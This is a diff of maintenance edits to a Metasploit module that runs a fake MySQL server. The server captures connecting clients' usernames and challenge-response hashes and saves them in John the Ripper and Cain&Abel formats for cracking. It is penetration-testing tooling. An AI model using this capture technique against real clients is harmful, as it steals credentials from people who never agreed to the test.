@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
@@ -32,7 +29,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('SRVVERSION', [ true, "The server version to report in the greeting response", "5.5.16" ]),
         OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
         OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
-      ], self.class)
+      ])
   end
 
   def setup
@@ -48,7 +45,6 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
     @version = datastore['SRVVERSION']
-    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
     exploit()
   end
 
@@ -62,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def mysql_send_greeting(c)
-    # http://forge.mysql.com/wiki/MySQL_Internals_ClientServer_Protocol#Handshake_Initialization_Packet
+    # https://dev.mysql.com/doc/internals/en/connection-phase-packets.html
 
     length = 68 + @version.length
     packetno = 0
@@ -142,7 +138,7 @@ class MetasploitModule < Msf::Auxiliary
       module_fullname: fullname,
       username: opts[:user],
       private_data: opts[:password],
-      private_type: :password
+      private_type: :nonreplayable_hash
     }.merge(service_data)
 
     login_data = {
@@ -165,9 +161,9 @@ class MetasploitModule < Msf::Auxiliary
     elsif info[:username] and info[:response]
       mysql_send_error(c, "Access denied for user '#{info[:username]}'@'#{c.peerhost}' (using password: YES)")
       if info[:database]
-        print_status("#{@state[c][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}; Database: #{info[:database]}")
+        print_good("#{@state[c][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}; Database: #{info[:database]}")
       else
-        print_status("#{@state[c][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}")
+        print_good("#{@state[c][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}")
       end
       hash_line = "#{info[:username]}:$mysql$#{@challenge.unpack("H*")[0]}$#{info[:response].unpack('H*')[0]}"
 
@@ -176,7 +172,7 @@ class MetasploitModule < Msf::Auxiliary
         port: datastore['SRVPORT'],
         service_name: 'mysql_client',
         user: info[:username],
-        pass: hash_line,
+        password: hash_line,
         proof: info[:database] ? info[:database] : hash_line
       )
 
